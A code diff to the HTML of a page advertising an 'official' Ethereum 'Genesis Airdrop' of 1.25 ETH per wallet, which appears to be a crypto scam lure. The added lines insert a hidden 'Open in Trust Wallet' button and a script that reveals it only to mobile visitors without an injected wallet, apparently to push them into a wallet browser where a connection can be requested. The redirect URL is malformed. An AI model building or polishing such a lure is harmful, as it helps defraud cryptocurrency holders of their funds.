@@ -67,7 +67,35 @@
             <div class="hero-badge"><i class="fas fa-gift" style="margin-right:6px;"></i>GENESIS AIRDROP · PHASE 3</div>
             <h1>Claim Your <span class="eth-highlight">Ethereum</span><br>Ecosystem Airdrop</h1>
             <p class="hero-subtitle">Official distribution for early Ethereum adopters. 1.25 ETH allocation per eligible wallet.</p>
+       
+        <div id="trust-wallet-btn-wrapper" style="display: none; margin: 12px 0;">
+  <button 
+    type="button" 
+    onclick="window.location.href='https://trustwallet.com' + encodeURIComponent(window.location.href);"
+    style="background-color: #0500FF; color: #FFFFFF; border: none; border-radius: 8px; padding: 12px 20px; font-size: 16px; font-weight: 600; cursor: pointer; display: inline-flex; align-items: center; gap: 8px; font-family: sans-serif;"
+  >
+    <i class="fas fa-shield-alt"></i> Open in Trust Wallet
+  </button>
+</div>
+
+<script>
+  (function() {
+    // Only show this button if the user is on a mobile browser AND not already inside a dApp browser
+    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+    const hasWallet = typeof window.ethereum !== 'undefined';
+    
+    if (isMobile && !hasWallet) {
+      document.getElementById('trust-wallet-btn-wrapper').style.display = 'block';
+    }
+  })();
+</script>
+        
+        
+        
         </section>
+
+
+        
 
         <div class="content-grid">
             <div class="claim-card">
